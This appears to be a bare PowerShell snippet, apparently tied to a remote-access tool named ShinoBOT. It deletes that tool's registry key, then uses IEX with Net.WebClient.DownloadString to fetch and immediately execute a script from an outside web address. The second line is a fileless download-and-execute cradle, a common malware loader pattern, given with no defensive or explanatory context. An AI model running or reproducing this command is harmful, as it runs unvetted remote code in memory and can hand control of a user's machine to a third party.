Remove-Item -Path "HKCU:\Software\ShinoBOT5" -Recurse
IEX (New-Object Net.WebClient).DownloadString('https://shinobotps1.com/download_get.php')
